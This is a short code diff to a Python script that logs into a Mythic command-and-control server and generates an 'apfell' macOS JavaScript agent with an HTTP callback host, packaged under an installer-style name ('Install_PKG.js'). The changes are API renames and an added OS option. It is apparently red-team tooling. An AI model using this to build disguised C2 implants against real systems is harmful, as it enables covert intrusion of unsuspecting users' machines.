@@ -21,7 +21,7 @@ def install_pkg():
 
     ## Create apfell payload
     async def scripting():
-        mythic = Mythic(
+        mythic = mythic_rest.Mythic(
             username=mythic_username,
             password=mythic_password,
             server_ip=mythic_server_ip,
@@ -32,17 +32,18 @@ def install_pkg():
         print("[+] Logging into Mythic")
         await mythic.login()
         await mythic.set_or_create_apitoken()
-        p = Payload(
+        p = mythic_rest.Payload(
             # what payload type is it
             payload_type="apfell", 
             c2_profiles={
-                "HTTP":[
+                "http":[
                         {"name": "callback_host", "value": mythic_http_callback_host},
                         {"name": "callback_interval", "value": mythic_http_callback_interval}
                     ]
                 },
             # give our payload a description if we want
             tag="Installer Pkg",
+            selected_os="macOS",
             # if we want to only include specific commands, put them here:
             #commands=["cmd1", "cmd2", "cmd3"],
             filename="Install_PKG.js")
